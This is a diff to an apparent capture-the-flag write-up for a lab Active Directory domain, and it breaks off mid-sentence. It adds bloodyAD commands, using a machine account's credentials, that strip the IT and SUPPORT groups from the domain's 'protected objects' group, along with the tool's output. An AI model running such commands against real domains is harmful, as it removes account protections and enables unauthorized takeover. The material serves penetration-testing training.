@@ -266,8 +266,19 @@ Both `bb.morgan` and `ee.reed` give the error `KDC_ERR_ETYPE_NOSUPP` when trying
 
 ![](Pasted%20image%2020261019164441.png)
 
-As seen from the setup, the users an
+As seen from the setup, the users arent directly part of the group, so in order to remove them i have to specify the group they are attached to
 
+```python
+❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'it-computer3$' -p 'Rusty88!' -k remove groupMember 'protected objects' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'     
+Clock skew detected. Adjusting local time by 7:59:59.072788. Retrying operation.
+[+] CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from protected objects
+
+❯❯❯ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'it-computer3$' -p 'Rusty88!' -k remove groupMember 'protected objects' 'CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB'
+Clock skew detected. Adjusting local time by 7:59:58.816041. Retrying operation.
+[+] CN=SUPPORT,CN=USERS,DC=RUSTYKEY,DC=HTB removed from protected objects
+```
+
+Now they should be remo
 
 
 
